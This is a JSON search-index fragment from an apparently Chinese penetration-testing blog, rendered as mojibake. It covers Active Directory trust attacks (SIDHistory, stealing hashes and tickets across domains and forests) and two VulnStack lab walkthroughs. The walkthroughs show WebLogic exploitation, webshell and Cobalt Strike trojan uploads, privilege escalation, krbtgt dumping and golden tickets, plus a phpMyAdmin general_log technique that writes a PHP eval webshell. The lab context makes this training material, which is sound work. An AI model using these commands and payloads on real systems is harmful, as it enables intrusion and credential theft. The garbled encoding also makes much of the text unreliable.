Groups)ï¼Œå¯ä»¥æ·»åŠ æ£®æ—å†…çš„ä»»ä½•æˆå‘˜ï¼Œä½†æ˜¯è·¨æ£®æ—çš„ä¸å¯ä»¥ã€‚åœ¨æ£®æ—å†…éƒ¨çš„è·¨åŸŸæ”»å‡»ä¸­ï¼Œæˆ‘ä»¬åªå…³æ³¨ç¬¬ä¸€ã€ä¸‰ç§åŸŸå†…ç»„ã€‚ä¸€ä¸ªç”¨æˆ·çš„ memberof å±æ€§ç”±ç»„çš„ member å±æ€§è®¡ç®— è€Œæ¥ï¼Œå‰ææ˜¯ç»„çš„ member å±æ€§å·²ç»æ›´æ–°åˆ°å…¨å±€ç›®å½•æ•°æ®åº“ä¸­(Global Catalog)ã€‚å¦‚æœä¸€ä¸ªç”¨æˆ·è¢«æ£®æ—ä¸­å¦å¤–ä¸€ä¸ªåŸŸæ·»åŠ ä¸ºé€šç”¨ç»„æˆå‘˜ï¼Œé€šç”¨ç»„å°† member å±æ€§æ›´æ–°åˆ°æ£®æ—çš„å…¨å±€ç›®å½•æ•°æ®åº“ä¸­ï¼Œç”¨æˆ·çš„ memberof å±æ€§ä¼šé€šè¿‡è®¡ç®—è¢«æ›´æ–°; ä¸€ä¸ªç”¨æˆ·è¢«æ£®æ—ä¸­å¦å¤–ä¸€ä¸ªåŸŸæ·»åŠ ä¸ºåŸŸæœ¬åœ°ç»„æˆå‘˜æ—¶ï¼Œç”±äºåŸŸæœ¬åœ°ç»„ä¸ä¼šæ›´æ–° memberof å±æ€§åˆ°å…¨å±€ç›®å½•æ•°æ®åº“ä¸­ï¼Œå› æ­¤ç”¨æˆ·çš„ memberof å±æ€§ä¹Ÿä¸ä¼šè¢«è®¡ç®—æ›´æ–°ã€‚æ‰€ä»¥ï¼Œå³ä½¿æˆ‘ä»¬æœ‰æƒé™æŸ¥è¯¢æ£®æ—çš„å…¨å±€ç›®å½•æ•°æ®åº“ï¼Œä¹Ÿåªèƒ½å¾—åˆ°è¢«æ·»åŠ åˆ°å…¶ä»–åŸŸé€šç”¨ç»„çš„æˆå‘˜å±æ€§ï¼Œè¦æƒ³è·å¾—åŠ å…¥å…¶ä»–åŸŸåŸŸæœ¬åœ°ç»„çš„æˆå‘˜å±æ€§ï¼Œéœ€è¦é€ä¸ªè½®è¯¢æ‰€æœ‰çš„åŸŸ æšä¸¾ç›®æ ‡åŸŸä¸­ä¸»æœº\\æœåŠ¡å™¨çš„æœ¬åœ°ç»„ï¼ŒæŸ¥çœ‹å“ªäº›å¤–æ¥ç”¨æˆ·è¢«åŠ å…¥åˆ°ä¸»æœº\\æœåŠ¡å™¨çš„æœ¬åœ°ç»„ï¼Œå¯ä»¥é€šè¿‡ GPO ç»„ç­–ç•¥è¿›è¡Œæšä¸¾ï¼Œä¹Ÿå¯ä»¥é€šè¿‡ PowerView é€ä¸ªæ¢æµ‹ï¼Œå½“ç„¶ BloodHood è‡ªåŠ¨åŒ–çš„å…¨éƒ¨æ¢æµ‹ã€‚ æšä¸¾ç›®æ ‡åŸŸå†…å¯¹è±¡çš„ ACLï¼Œæ£€æŸ¥æ˜¯å¦æœ‰åŒ…å«å¤–æ¥åŸŸç”¨æˆ·çš„åŸŸå¯¹è±¡ ACLã€‚ä¸€èˆ¬è€Œè¨€ï¼Œä»»æ„ç”¨æˆ·å‡å¯æŸ¥çœ‹æ‰€æœ‰åŸŸå†…å¯¹è±¡çš„ ACLï¼ŒåŒæ—¶å…¨å±€æ•°æ®åº“ä¸­ä¿å­˜äº†æ‰€æœ‰åŸŸå¯¹è±¡çš„ ACLï¼Œå¯ä»¥å¾ˆæ–¹ä¾¿çš„æšä¸¾ã€‚PowerView æä¾›äº† Get-DomainObjectACL å‘½ä»¤ï¼Œå¯æ–¹ä¾¿æšä¸¾ å¯¹ç¬¬ 2ã€3ã€4 æ­¥ç­›é€‰å‡ºçš„ç”¨æˆ·åšç¬¬äºŒæ¬¡ç­›é€‰ï¼Œç­›é€‰å‡ºå±äºå½“å‰åŸŸçš„ç”¨æˆ·ï¼Œä½œä¸ºåœ¨å½“å‰åŸŸä¸­çš„æ”»å‡»å¯¹è±¡ï¼Œä¾‹å¦‚è·å–ç›®æ ‡ç”¨æˆ·çš„ NTLM å€¼æˆ–è€… TGT ç¥¨æ®ï¼Œæœ¬åŸŸçš„æ”»å‡»æ–¹æ³•ã€‚ åˆ©ç”¨ç¬¬ 3 æ­¥æ”»å‡»è·å–çš„ç”¨æˆ· NTLM å€¼æˆ–è€… TGT ç¥¨æ® è¿›è¡Œè·¨åŸŸè®¿é—®ï¼Œè¿›å…¥ç›®æ ‡åŸŸï¼Œç„¶åæ”»å‡»è·å–ç›®æ ‡åŸŸçš„ Krbtgt è´¦å·æˆ–è€… IRKey è´¦å·çš„ NTLM å€¼ï¼Œå¦‚æœæ¡ä»¶ä¸æˆç†Ÿï¼Œç»§ç»­ä¸Šé¢çš„æ­¥éª¤ï¼Œé€æ­¥è¿›å…¥æ›´å¤šçš„åŸŸä¸­å¯»æ‰¾æœºä¼šã€‚å½“ä¸€ä¸ªç”¨æˆ·è¢«æ£®æ—å¤–éƒ¨åŸŸåŠ å…¥æŸä¸ªç»„æ—¶ï¼Œä¼šå‡ºç°åœ¨å¤–éƒ¨ç›®æ ‡åŸŸçš„ CN=ForeignSecurityPrincipals,DC=domain,DC=com ç»„ä¸­ï¼Œç›¸å½“äºç”¨æˆ·åœ¨å¤–éƒ¨åŸŸä¸­çš„ä»£è¡¨æˆ–è€…åˆ«åï¼Œè€Œä¸”åŸŸä¸­çš„æ‰€æœ‰å¤–æ¥ç”¨æˆ·å…·å¤‡ç›¸åŒçš„ SIDï¼Œè¿™æ˜¯è·¨æ£®æ—çš„ SID è¿‡æ»¤å®‰å…¨æœºåˆ¶çš„æ•ˆæœã€‚ æ‰€ä»¥åªè¦æšä¸¾ ForeignSecurityPrincipals ç»„ï¼Œå°±å¯å¾—çŸ¥å“ªäº›ç”¨æˆ·å…·æœ‰è¿™ä¸ªå¤–éƒ¨æ£®æ—çš„è®¿é—®æƒé™ï¼Œå‡è®¾ç”¨æˆ·ç»“æœé›†åˆä¸º ExternalUsersã€‚æ¥ä¸‹æ¥ï¼Œå…ˆæŸ¥çœ‹æ˜¯å¦åŒ…å«æˆ‘ä»¬å½“å‰æ‰€åœ¨åŸŸçš„ç”¨æˆ·ï¼Œå¦‚æœæœ‰ï¼Œåˆ™ç›´æ¥æ”»å‡»è¿™äº›ç”¨æˆ·è·å– NTLM å€¼æˆ–è€… TGT ç¥¨æ®ï¼Œä»è€Œè·å–æ£®æ—å¤–éƒ¨åŸŸçš„èµ„æºè®¿é—®æƒé™ å¦‚æœæ²¡æœ‰ï¼Œåˆ™æŸ¥çœ‹ ExternalUsers æ˜¯å¦åŒ…å«æˆ‘ä»¬å½“å‰æ‰€åœ¨æ£®æ—çš„ç”¨æˆ·ï¼Œå‡è®¾ç»“æœåˆé›†ä¸º InternalUsersã€‚åœ¨å½“å‰æ£®æ—ä¸­æŸ¥è¯¢å®šä½ InternalUsers æ‰€åœ¨çš„åŸŸã€‚ä»¥è¿™äº›åŸŸä¸ºç›®æ ‡ï¼Œä½¿ç”¨æ£®æ—å†…éƒ¨çš„è·¨åŸŸæ”»å‡»æ–¹æ³•ï¼Œæ”»å‡»è¿™äº›åŸŸï¼Œè·å–è¿›å…¥è¿™äº›åŸŸçš„æƒé™ï¼Œå†ä»è¿™äº›åŸŸä¸­æ”»å‡» InternalUsers ä¸­çš„ç”¨æˆ·ï¼Œä»è€Œè·å–å¤–éƒ¨åŸŸçš„èµ„æºè®¿é—®æƒé™ï¼Œè¿™æ˜¯ä¸€ç§ç»•é“æ”»å‡» ","date":"2020-05-05","objectID":"/2020/05/%E5%9F%BA%E4%BA%8E%E5%9F%9F%E4%BF%A1%E4%BB%BB%E5%85%B3%E7%B3%BB%E7%9A%84%E5%9F%9F%E6%94%BB%E5%87%BB/:6:0","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€","åŸŸä¿¡ä»»å…³ç³»"],"title":"åŸºäºåŸŸä¿¡ä»»å…³ç³»çš„åŸŸæ”»å‡»","uri":"/2020/05/%E5%9F%BA%E4%BA%8E%E5%9F%9F%E4%BF%A1%E4%BB%BB%E5%85%B3%E7%B3%BB%E7%9A%84%E5%9F%9F%E6%94%BB%E5%87%BB/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"SID è¿‡æ»¤æœºåˆ¶ å¾®è½¯å®£ç§° æ£®æ—æ˜¯æ´»åŠ¨ç›®å½•çš„å®‰å…¨è¾¹ç•Œï¼Œä½†æ˜¯è·¨æ£®æ—çš„æ”»å‡»åœ¨ 2005 å¹´å°±å·²ç»å‡ºç°ã€‚é¦–å…ˆè§£é‡Šä»€ä¹ˆæ˜¯ SIDHistory å’Œ SID è¿‡æ»¤æœºåˆ¶ ","date":"2020-05-05","objectID":"/2020/05/%E5%9F%BA%E4%BA%8E%E5%9F%9F%E4%BF%A1%E4%BB%BB%E5%85%B3%E7%B3%BB%E7%9A%84%E5%9F%9F%E6%94%BB%E5%87%BB/:7:0","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€","åŸŸä¿¡ä»»å…³ç³»"],"title":"åŸºäºåŸŸä¿¡ä»»å…³ç³»çš„åŸŸæ”»å‡»","uri":"/2020/05/%E5%9F%BA%E4%BA%8E%E5%9F%9F%E4%BF%A1%E4%BB%BB%E5%85%B3%E7%B3%BB%E7%9A%84%E5%9F%9F%E6%94%BB%E5%87%BB/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"SIDHistory SIDHistory(åœ¨ PAC ç»“æ„ä¸­ä¸º ExtraSids å­—æ®µ)æ˜¯ä¸ºäº†æ–¹ä¾¿ç”¨æˆ·åœ¨åŸŸä¹‹é—´çš„è¿ç§»ã€‚å½“ä¸€ä¸ªç”¨æˆ·è¿ç§»åˆ°æ–°çš„åŸŸåï¼ŒåŸæ¥çš„ SID ä»¥åŠæ‰€åœ¨ç»„çš„ä¸€äº› SIDï¼Œéƒ½å¯è¢«åŠ å…¥åˆ°æ–°åŸŸä¸­æ–°ç”¨æˆ·çš„ SIDHistory å±æ€§ã€‚å½“è¿™ä¸ªæ–°çš„ç”¨æˆ·è®¿é—®æŸä¸ªèµ„æºæ—¶ï¼Œæ ¹æ® SID æˆ–è€… SIDHistory åœ¨èµ„æº ACL ä¸­çš„åŒ¹é…æ€§æ¥åˆ¤æ–­æ˜¯æ‹’ç»æˆ–è€…å…è®¸è®¿é—®ã€‚å› æ­¤ SIDHistory ç›¸å½“äºå¤šäº†ä¸€ä¸ªæˆ–è€…å¤šä¸ªç»„å±æ€§ï¼Œæƒé™å¾—åˆ°äº†æ‰©å¼  åœ¨åŒä¸€ä¸ªæ£®æ—å†…éƒ¨çš„è·¨åŸŸä¿¡ä»»å…³ç³»ä¸­ï¼ŒSIDHistory å±æ€§æ²¡æœ‰è¢« SID è¿‡æ»¤ä¿æŠ¤æœºåˆ¶è¿‡æ»¤ã€‚å¦‚æœä¸€ä¸ªå­åŸŸçš„ç”¨æˆ· SIDHistory å±æ€§æ·»åŠ äº†ä¼ä¸šç®¡ç†å‘˜(ä¼ä¸šç®¡ç†å‘˜è‚¯å®šæ˜¯æ£®æ—çš„ç®¡ç†å‘˜)çš„ SIDï¼Œåˆ™å­ç”¨æˆ·å…·å¤‡äº†æ£®æ—çš„ä¼ä¸šç®¡ç†å‘˜æƒé™ï¼Œæƒé™å¾—åˆ°äº†æ‰©å¼ ï¼Œæ‰€ä»¥ SIDHistory åæ¥è¢«ä¿®æ”¹ä¸ºå—ä¿æŠ¤çš„å±æ€§ è€Œè·¨æ£®æ—çš„ä¿¡ä»»å…³ç³»ä¸­ï¼ŒSIDHistory å±æ€§è¢« SID è¿‡æ»¤æœºåˆ¶è¿‡æ»¤ï¼Œä¸å†å…·å¤‡ä¸Šé¢çš„ç‰¹æƒå±æ€§ï¼Œè¿™ä¹Ÿæ˜¯ æ£®æ—æ˜¯æ´»åŠ¨ç›®å½•çš„å®‰å…¨è¾¹ç•Œ çš„åŸå› ä¹‹ä¸€ ","date":"2020-05-05","objectID":"/2020/05/%E5%9F%BA%E4%BA%8E%E5%9F%9F%E4%BF%A1%E4%BB%BB%E5%85%B3%E7%B3%BB%E7%9A%84%E5%9F%9F%E6%94%BB%E5%87%BB/:7:1","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€","åŸŸä¿¡ä»»å…³ç³»"],"title":"åŸºäºåŸŸä¿¡ä»»å…³ç³»çš„åŸŸæ”»å‡»","uri":"/2020/05/%E5%9F%BA%E4%BA%8E%E5%9F%9F%E4%BF%A1%E4%BB%BB%E5%85%B3%E7%B3%BB%E7%9A%84%E5%9F%9F%E6%94%BB%E5%87%BB/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"SID è¿‡æ»¤æœºåˆ¶ å½“ä¸€ä¸ªç”¨æˆ·çš„ TGT é€šè¿‡åŸŸä¿¡ä»»å…³ç³»è¢«è½¬é€’åˆ°ä¸€ä¸ªæ–°åŸŸåï¼ŒTGT ä¸­çš„ PAC(privileged attribute certificate) åŒ…å«ç”¨æˆ·çš„ SID å’Œ SIDHistoryã€‚æ–°åŸŸå¯¹ PAC è¿›è¡Œä¸¥æ ¼çš„å®¡æŸ¥ ï¼Œå¹¶æ ¹æ®ä¿¡ä»»å…³ç³»çš„ç±»åˆ«æ‰§è¡Œå„ç§å®‰å…¨è¿‡æ»¤æœºåˆ¶ è¿‡æ»¤çš„æœºåˆ¶æŒ‰ç…§åˆ†ç±»è¿›è¡Œè¿‡æ»¤ï¼Œæœ‰äº› SID æ˜¯ä¸€ç›´è¢«æ‹’ç»çš„ï¼Œæˆ‘ä»¬å…³æ³¨çš„ä¼ä¸šç®¡ç†å‘˜ (S-1-5-21-\u003cDomain\u003e-5 19) çš„ SID æ˜¯è¢« ForestSpecific è§„åˆ™è¿‡æ»¤ï¼Œå› ä¸ºæ£®æ—æ‹’ç»æ¥è‡ªæ£®æ—ä¹‹å¤–çš„ç‰¹æƒ SIDHistoryã€‚å¾®è½¯å‘å¸ƒäº† SID è¿‡æ»¤çš„è¯¦ç»†æè¿°ã€‚ ","date":"2020-05-05","objectID":"/2020/05/%E5%9F%BA%E4%BA%8E%E5%9F%9F%E4%BF%A1%E4%BB%BB%E5%85%B3%E7%B3%BB%E7%9A%84%E5%9F%9F%E6%94%BB%E5%87%BB/:7:2","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€","åŸŸä¿¡ä»»å…³ç³»"],"title":"åŸºäºåŸŸä¿¡ä»»å…³ç³»çš„åŸŸæ”»å‡»","uri":"/2020/05/%E5%9F%BA%E4%BA%8E%E5%9F%9F%E4%BF%A1%E4%BB%BB%E5%85%B3%E7%B3%BB%E7%9A%84%E5%9F%9F%E6%94%BB%E5%87%BB/"},{"categories":["é¶åœº"],"content":"VulnStack ATT\u0026CK 2 é¶åœºç»ƒä¹ è®°å½•","date":"2020-04-18","objectID":"/2020/04/vulnstack-attck-2-%E9%9D%B6%E5%9C%BA/","tags":["å†…ç½‘é¶åœº","é¶åœº"],"title":"VulnStack ATT\u0026CK 2 é¶åœº","uri":"/2020/04/vulnstack-attck-2-%E9%9D%B6%E5%9C%BA/"},{"categories":["é¶åœº"],"content":"VulnStack ATT\u0026CK 2 é¶åœº ","date":"2020-04-18","objectID":"/2020/04/vulnstack-attck-2-%E9%9D%B6%E5%9C%BA/:0:0","tags":["å†…ç½‘é¶åœº","é¶åœº"],"title":"VulnStack ATT\u0026CK 2 é¶åœº","uri":"/2020/04/vulnstack-attck-2-%E9%9D%B6%E5%9C%BA/"},{"categories":["é¶åœº"],"content":"ç¯å¢ƒ ","date":"2020-04-18","objectID":"/2020/04/vulnstack-attck-2-%E9%9D%B6%E5%9C%BA/:1:0","tags":["å†…ç½‘é¶åœº","é¶åœº"],"title":"VulnStack ATT\u0026CK 2 é¶åœº","uri":"/2020/04/vulnstack-attck-2-%E9%9D%B6%E5%9C%BA/"},{"categories":["é¶åœº"],"content":"ä¿¡æ¯æ”¶é›† ","date":"2020-04-18","objectID":"/2020/04/vulnstack-attck-2-%E9%9D%B6%E5%9C%BA/:2:0","tags":["å†…ç½‘é¶åœº","é¶åœº"],"title":"VulnStack ATT\u0026CK 2 é¶åœº","uri":"/2020/04/vulnstack-attck-2-%E9%9D%B6%E5%9C%BA/"},{"categories":["é¶åœº"],"content":"nmap ç«¯å£æ‰«æ PORT STATE SERVICE VERSION 80/tcp open http Microsoft IIS httpd 7.5 | http-methods: | Supported Methods: OPTIONS TRACE GET HEAD POST |_ Potentially risky methods: TRACE |_http-server-header: Microsoft-IIS/7.5 |_http-title: Site doesn't have a title. 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open microsoft-ds Windows Server 2008 R2 Standard 7601 Service Pack 1 microsoft-ds 1433/tcp open ms-sql-s Microsoft SQL Server 2008 R2 10.50.4000.00; SP2 | ms-sql-ntlm-info: | Target_Name: DE1AY | NetBIOS_Domain_Name: DE1AY | NetBIOS_Computer_Name: WEB | DNS_Domain_Name: de1ay.com | DNS_Computer_Name: WEB.de1ay.com | DNS_Tree_Name: de1ay.com |_ Product_Version: 6.1.7601 | ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback | Issuer: commonName=SSL_Self_Signed_Fallback | Public Key type: rsa | Public Key bits: 1024 | Signature Algorithm: sha1WithRSAEncryption | Not valid before: 2020-04-18T03:37:19 | Not valid after: 2050-04-18T03:37:19 | MD5: 83a6 3f23 de4f e053 4224 f66c a547 3223 |_SHA-1: 0aad 0382 de96 c9da 3990 3014 360c 7f31 bf78 a3df |_ssl-date: 2020-04-18T06:12:57+00:00; -2s from scanner time. 3389/tcp open ms-wbt-server Microsoft Terminal Services | rdp-ntlm-info: | Target_Name: DESKTOP-DUNPKQ9 | NetBIOS_Domain_Name: DESKTOP-DUNPKQ9 | NetBIOS_Computer_Name: DESKTOP-DUNPKQ9 | DNS_Domain_Name: DESKTOP-DUNPKQ9 | DNS_Computer_Name: DESKTOP-DUNPKQ9 | Product_Version: 10.0.17763 |_ System_Time: 2020-04-18T06:12:19+00:00 | ssl-cert: Subject: commonName=DESKTOP-DUNPKQ9 | Issuer: commonName=DESKTOP-DUNPKQ9 | Public Key type: rsa | Public Key bits: 2048 | Signature Algorithm: sha256WithRSAEncryption | Not valid before: 2020-02-23T21:21:14 | Not valid after: 2020-08-24T21:21:14 | MD5: 5cb3 a3dd 4a5e eb67 80d5 8f39 633f d11b |_SHA-1: 9694 4630 239e d821 3658 976c 40a1 6d3b d9b4 e80f |_ssl-date: 2020-04-18T06:12:57+00:00; -2s from scanner time. 7001/tcp open http Oracle WebLogic Server (Servlet 2.5; JSP 2.1) |_http-title: Error 404--Not Found 49152/tcp open msrpc Microsoft Windows RPC 49153/tcp open msrpc Microsoft Windows RPC Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows Host script results: |_clock-skew: mean: -1h08m35s, deviation: 3h01m23s, median: -2s | ms-sql-info: | 192.168.3.242:1433: | Version: | name: Microsoft SQL Server 2008 R2 SP2 | number: 10.50.4000.00 | Product: Microsoft SQL Server 2008 R2 | Service pack level: SP2 | Post-SP patches applied: false |_ TCP port: 1433 | smb-os-discovery: | OS: Windows Server 2008 R2 Standard 7601 Service Pack 1 (Windows Server 2008 R2 Standard 6.1) | OS CPE: cpe:/o:microsoft:windows_server_2008::sp1 | Computer name: WEB | NetBIOS computer name: WEB\\x00 | Domain name: de1ay.com | Forest name: de1ay.com | FQDN: WEB.de1ay.com |_ System time: 2020-04-18T14:12:22+08:00 | smb-security-mode: | account_used: guest | authentication_level: user | challenge_response: supported |_ message_signing: disabled (dangerous, but default) | smb2-security-mode: | 2.02: |_ Message signing enabled but not required | smb2-time: | date: 2020-04-18T06:12:20 |_ start_date: 2020-04-18T03:37:46 å‘ç° 7001 ç«¯å£çš„ weblogicï¼Œè®¿é—® http://192.168.3.242:7001/consoleï¼Œç‰ˆæœ¬å·ä¸ºï¼š10.3.6.0 ä½¿ç”¨ weblogicScanner æ‰«æ weblogic æœåŠ¡å™¨ï¼Œå‘ç° cve-2019-2725 æ¼æ´ã€‚ ","date":"2020-04-18","objectID":"/2020/04/vulnstack-attck-2-%E9%9D%B6%E5%9C%BA/:2:1","tags":["å†…ç½‘é¶åœº","é¶åœº"],"title":"VulnStack ATT\u0026CK 2 é¶åœº","uri":"/2020/04/vulnstack-attck-2-%E9%9D%B6%E5%9C%BA/"},{"categories":["é¶åœº"],"content":"æ¼æ´åˆ©ç”¨ ","date":"2020-04-18","objectID":"/2020/04/vulnstack-attck-2-%E9%9D%B6%E5%9C%BA/:3:0","tags":["å†…ç½‘é¶åœº","é¶åœº"],"title":"VulnStack ATT\u0026CK 2 é¶åœº","uri":"/2020/04/vulnstack-attck-2-%E9%9D%B6%E5%9C%BA/"},{"categories":["é¶åœº"],"content":"weblogic ä¸Šä¼ ä¸€ä¸ª webshell æ–¹ä¾¿åç»­æ“ä½œã€‚ å…³äº weblogic ä¸Šä¼ è·¯å¾„çš„é—®é¢˜ï¼Œå¯ä»¥å‚è€ƒ https://www.cnblogs.com/sstfy/p/10350915.html å†°èè¿æ¥ï¼š ä¸Šä¼  cs æœ¨é©¬ï¼š æ‰§è¡Œï¼š ä¹‹å‰å‘ç°æ˜¯åŸŸç”¨æˆ·ï¼Œipconfig çœ‹ä¸‹ ipï¼š å‘ç°è¯¥æœºå™¨ä¸ºåŒç½‘å¡ï¼Œä¸”å†…ç½‘ä¸º 10.10.10.xx ç½‘æ®µã€‚ ","date":"2020-04-18","objectID":"/2020/04/vulnstack-attck-2-%E9%9D%B6%E5%9C%BA/:3:1","tags":["å†…ç½‘é¶åœº","é¶åœº"],"title":"VulnStack ATT\u0026CK 2 é¶åœº","uri":"/2020/04/vulnstack-attck-2-%E9%9D%B6%E5%9C%BA/"},{"categories":["é¶åœº"],"content":"å†…ç½‘æ¸—é€ ","date":"2020-04-18","objectID":"/2020/04/vulnstack-attck-2-%E9%9D%B6%E5%9C%BA/:4:0","tags":["å†…ç½‘é¶åœº","é¶åœº"],"title":"VulnStack ATT\u0026CK 2 é¶åœº","uri":"/2020/04/vulnstack-attck-2-%E9%9D%B6%E5%9C%BA/"},{"categories":["é¶åœº"],"content":"dump å¯†ç  ","date":"2020-04-18","objectID":"/2020/04/vulnstack-attck-2-%E9%9D%B6%E5%9C%BA/:4:1","tags":["å†…ç½‘é¶åœº","é¶åœº"],"title":"VulnStack ATT\u0026CK 2 é¶åœº","uri":"/2020/04/vulnstack-attck-2-%E9%9D%B6%E5%9C%BA/"},{"categories":["é¶åœº"],"content":"ææƒ ä½¿ç”¨ ms-14-058 ææƒåˆ° SYSTEM æƒé™æ–¹ä¾¿è¿›ä¸€æ­¥æ“ä½œï¼š ","date":"2020-04-18","objectID":"/2020/04/vulnstack-attck-2-%E9%9D%B6%E5%9C%BA/:4:2","tags":["å†…ç½‘é¶åœº","é¶åœº"],"title":"VulnStack ATT\u0026CK 2 é¶åœº","uri":"/2020/04/vulnstack-attck-2-%E9%9D%B6%E5%9C%BA/"},{"categories":["é¶åœº"],"content":"åŸŸå†…ä¿¡æ¯æ”¶é›† æŸ¥çœ‹åŸŸå æŸ¥çœ‹åŸŸå†…ä¸»æœº æŸ¥çœ‹åŸŸå†…ç”¨æˆ· æŸ¥çœ‹åŸŸæ§ æŸ¥çœ‹åŸŸç®¡ ","date":"2020-04-18","objectID":"/2020/04/vulnstack-attck-2-%E9%9D%B6%E5%9C%BA/:4:3","tags":["å†…ç½‘é¶åœº","é¶åœº"],"title":"VulnStack ATT\u0026CK 2 é¶åœº","uri":"/2020/04/vulnstack-attck-2-%E9%9D%B6%E5%9C%BA/"},{"categories":["é¶åœº"],"content":"æ¨ªå‘ç§»åŠ¨ åˆ©ç”¨ PsExec æ¨ªå‘ç§»åŠ¨è‡³ DCï¼š ","date":"2020-04-18","objectID":"/2020/04/vulnstack-attck-2-%E9%9D%B6%E5%9C%BA/:4:4","tags":["å†…ç½‘é¶åœº","é¶åœº"],"title":"VulnStack ATT\u0026CK 2 é¶åœº","uri":"/2020/04/vulnstack-attck-2-%E9%9D%B6%E5%9C%BA/"},{"categories":["é¶åœº"],"content":"åé—¨ åŸŸæ§ä¸Šçš„ä¿¡æ¯æ”¶é›† æŠ“å– krbtgt çš„ hashï¼š åˆ¶ä½œé»„é‡‘ç¥¨æ® æ³¨å…¥ç¥¨æ®å‰ï¼š æ³¨å…¥ç¥¨æ®åï¼š ","date":"2020-04-18","objectID":"/2020/04/vulnstack-attck-2-%E9%9D%B6%E5%9C%BA/:4:5","tags":["å†…ç½‘é¶åœº","é¶åœº"],"title":"VulnStack ATT\u0026CK 2 é¶åœº","uri":"/2020/04/vulnstack-attck-2-%E9%9D%B6%E5%9C%BA/"},{"categories":["é¶åœº"],"content":"VulnStack ATT\u0026CK 1 é¶åœºç»ƒä¹ è®°å½•","date":"2020-04-16","objectID":"/2020/04/vulnstack-attck-1-%E9%9D%B6%E5%9C%BA/","tags":["å†…ç½‘é¶åœº","é¶åœº"],"title":"VulnStack ATT\u0026CK 1 é¶åœº","uri":"/2020/04/vulnstack-attck-1-%E9%9D%B6%E5%9C%BA/"},{"categories":["é¶åœº"],"content":"VulnStack ATT\u0026CK 1 é¶åœº ","date":"2020-04-16","objectID":"/2020/04/vulnstack-attck-1-%E9%9D%B6%E5%9C%BA/:0:0","tags":["å†…ç½‘é¶åœº","é¶åœº"],"title":"VulnStack ATT\u0026CK 1 é¶åœº","uri":"/2020/04/vulnstack-attck-1-%E9%9D%B6%E5%9C%BA/"},{"categories":["é¶åœº"],"content":"ç¯å¢ƒ ","date":"2020-04-16","objectID":"/2020/04/vulnstack-attck-1-%E9%9D%B6%E5%9C%BA/:1:0","tags":["å†…ç½‘é¶åœº","é¶åœº"],"title":"VulnStack ATT\u0026CK 1 é¶åœº","uri":"/2020/04/vulnstack-attck-1-%E9%9D%B6%E5%9C%BA/"},{"categories":["é¶åœº"],"content":"ä¿¡æ¯æ”¶é›† ","date":"2020-04-16","objectID":"/2020/04/vulnstack-attck-1-%E9%9D%B6%E5%9C%BA/:2:0","tags":["å†…ç½‘é¶åœº","é¶åœº"],"title":"VulnStack ATT\u0026CK 1 é¶åœº","uri":"/2020/04/vulnstack-attck-1-%E9%9D%B6%E5%9C%BA/"},{"categories":["é¶åœº"],"content":"ç«¯å£æ¢æµ‹ åªå¼€æ”¾äº†80ã€3306 ","date":"2020-04-16","objectID":"/2020/04/vulnstack-attck-1-%E9%9D%B6%E5%9C%BA/:2:1","tags":["å†…ç½‘é¶åœº","é¶åœº"],"title":"VulnStack ATT\u0026CK 1 é¶åœº","uri":"/2020/04/vulnstack-attck-1-%E9%9D%B6%E5%9C%BA/"},{"categories":["é¶åœº"],"content":"ç›®å½•æ‰«æ è®¿é—® 80 ç«¯å£ï¼Œå‘ç°é¦–é¡µä¸º PHP æ¢é’ˆï¼š ç›®å½•æ‰«æï¼š å‘ç° phpmyadminã€‚ ","date":"2020-04-16","objectID":"/2020/04/vulnstack-attck-1-%E9%9D%B6%E5%9C%BA/:2:2","tags":["å†…ç½‘é¶åœº","é¶åœº"],"title":"VulnStack ATT\u0026CK 1 é¶åœº","uri":"/2020/04/vulnstack-attck-1-%E9%9D%B6%E5%9C%BA/"},{"categories":["é¶åœº"],"content":"æ¼æ´æŒ–æ˜ phpmyadmin å°è¯•è‹¥å£ä»¤ç™»å½•ï¼š root:root ç™»å½•æˆåŠŸã€‚ phpmyadmin åå°çš„ getshell æ–¹æ³•æœ‰å¾ˆå¤šç§ å…ˆçœ‹ä¸‹å¸¸è§„çš„ select into outfileï¼š è¿™é‡Œ secure_file_priv ä¸º nullï¼Œä¸å…è®¸å†™å…¥å†™å‡ºã€‚ æ”¾å¼ƒæ­¤æ–¹æ³•ï¼Œå°è¯• MySQL é€šç”¨æŸ¥è¯¢æ—¥å¿— general_log å†™å‡º webshellã€‚ å…ˆçœ‹ä¸‹å…¨å±€å˜é‡çš„é…ç½® show global variables like '%general%' ï¼š è¿™é‡Œå¹¶æ²¡æœ‰å¼€å¯é€šç”¨æ—¥å¿—ï¼Œé‚£æˆ‘å°±è‡ªå·±æ‰“å¼€ï¼Œå¹¶è‡ªå®šä¹‰ä¿å­˜æ–‡ä»¶ï¼š SET GLOBAL general_log = 'ON' SET GLOBAL general_log_file = 'C:/phpStudy/WWW/shell.php' è¿™é‡Œçš„ç»å¯¹è·¯å¾„æ˜¯é€šè¿‡å‰é¢çš„æ¢é’ˆè·å–åˆ°çš„ã€‚ ç„¶åå†™ webshell select '\u003c?php @eval($_POST[\"bbll]);?\u003e'ï¼š èšå‰‘è¿æ¥ï¼š ","date":"2020-04-16","objectID":"/2020/04/vulnstack-attck-1-%E9%9D%B6%E5%9C%BA/:3:0","tags":["å†…ç½‘é¶åœº","é¶åœº"],"title":"VulnStack ATT\u0026CK 1 é¶åœº","uri":"/2020/04/vulnstack-attck-1-%E9%9D%B6%E5%9C%BA/"},{"categories":["é¶åœº"],"content":"å†…ç½‘æ¸—é€ é¦–å…ˆæŸ¥çœ‹ç³»ç»Ÿä½æ•°ï¼š wmic cpu get addresswidth ç”¨ cs ç”Ÿæˆæœ¨é©¬ï¼Œä¸Šä¼ ï¼š æ‰§è¡Œï¼š ä¸Šçº¿ï¼Œç›´æ¥æ˜¯ç®¡ç†å‘˜æƒé™ï¼š æŸ¥çœ‹ç”¨æˆ·æƒé™ï¼š æŸ¥çœ‹å½“å‰ç™»å½•åŸŸï¼š æŸ¥çœ‹åŸŸå†…ç”¨æˆ·ï¼š 